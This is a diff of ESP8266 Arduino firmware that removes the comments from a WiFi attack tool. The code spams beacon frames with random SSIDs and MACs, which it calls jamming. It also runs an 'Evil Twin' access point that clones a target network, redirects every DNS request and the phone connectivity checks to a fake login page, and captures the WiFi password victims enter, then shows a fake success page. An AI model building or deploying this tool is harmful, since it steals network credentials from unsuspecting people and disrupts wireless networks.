@@ -7,7 +7,6 @@
  * This works on ESP8266 because it supports raw packet injection
  * Evil Twin captures WiFi passwords via captive portal
  */
-
 #include <ESP8266WiFi.h>
 #include <ESP8266WebServer.h>
 #include <DNSServer.h>
@@ -16,18 +15,17 @@ extern "C" {
   #include "user_interface.h"
 }
 
-// Beacon frame for jamming
 uint8_t beaconPacket[128] = {
-  0x80, 0x00,                         // Type: Beacon
-  0x00, 0x00,                         // Duration
-  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
-  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source (random)
-  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID (random)
-  0x00, 0x00,                         // Sequence
-  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
-  0x64, 0x00,                         // Beacon interval
-  0x11, 0x04,                         // Capability info
-  0x00, 0x00                          // SSID parameter set (will be filled)
+  0x80, 0x00,
+  0x00, 0x00,
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
+  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
+  0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x64, 0x00,
+  0x11, 0x04,
+  0x00, 0x00
 };
 
 String targetSSID = "";
@@ -38,7 +36,6 @@ bool evilTwinActive = false;
 int packetsSent = 0;
 int connectedDevices = 0;
 
-// Captive portal
 ESP8266WebServer server(80);
 DNSServer dnsServer;
 const byte DNS_PORT = 53;
@@ -59,14 +56,12 @@ void setup() {
 }
 
 void loop() {
-  // Handle Evil Twin captive portal
   if (evilTwinActive) {
     dnsServer.processNextRequest();
     server.handleClient();
     
-    // Update connected devices count
     static unsigned long lastCheck = 0;
-    if (millis() - lastCheck > 2000) { // Check every 2 seconds
+    if (millis() - lastCheck > 2000) {
       int newCount = WiFi.softAPgetStationNum();
       if (newCount != connectedDevices) {
         connectedDevices = newCount;
@@ -94,25 +89,21 @@ void loop() {
     }
   }
   
-  // Send beacon spam if active
   if (jammerActive) {
-    // Generate random SSID
     char randomSSID[33];
     for (int i = 0; i < 8; i++) {
-      randomSSID[i] = random(65, 90); // A-Z
+      randomSSID[i] = random(65, 90);
     }
     randomSSID[8] = '\0';
     
-    // Random MAC
     for (int i = 0; i < 6; i++) {
       beaconPacket[10 + i] = random(256);
       beaconPacket[16 + i] = beaconPacket[10 + i];
     }
     
-    // Build SSID tag
     uint8_t packet[128];
     memcpy(packet, beaconPacket, 38);
-    packet[38] = 0x00; // SSID tag
+    packet[38] = 0x00;
     packet[39] = strlen(randomSSID);
     memcpy(&packet[40], randomSSID, strlen(randomSSID));
     
@@ -248,25 +239,21 @@ void startEvilTwin() {
     return;
   }
   
-  // Stop jammer if running
   if (jammerActive) {
     jammerActive = false;
     Serial.println("Jammer stopped for Evil Twin");
   }
   
-  // Create open AP with target SSID
   WiFi.mode(WIFI_AP);
   WiFi.softAP(targetSSID.c_str());
   
-  // Start DNS server (captive portal)
   dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
   
-  // Setup web server routes
   server.on("/", handleRoot);
   server.on("/submit", handleSubmit);
-  server.on("/generate_204", handleRoot);  // Android captive portal check
-  server.on("/gen_204", handleRoot);       // Android
-  server.on("/hotspot-detect.html", handleRoot); // iOS
+  server.on("/generate_204", handleRoot);
+  server.on("/gen_204", handleRoot);
+  server.on("/hotspot-detect.html", handleRoot);
   server.onNotFound(handleRoot);
   server.begin();
   
@@ -325,7 +312,6 @@ void stopEvilTwin() {
   showMenu();
 }
 
-// Captive Portal - Login Page
 void handleRoot() {
   String html = "<!DOCTYPE html><html><head>";
   html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
@@ -353,7 +339,6 @@ void handleRoot() {
   server.send(200, "text/html", html);
 }
 
-// Handle password submission
 void handleSubmit() {
   if (server.hasArg("password")) {
     capturedPassword = server.arg("password");
@@ -366,7 +351,6 @@ void handleSubmit() {
     Serial.println(capturedPassword);
     Serial.println("====================\n");
     
-    // Success page - user thinks they're connected
     String html = "<!DOCTYPE html><html><head>";
     html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
     html += "<meta http-equiv='refresh' content='3;url=http://www.google.com'>";
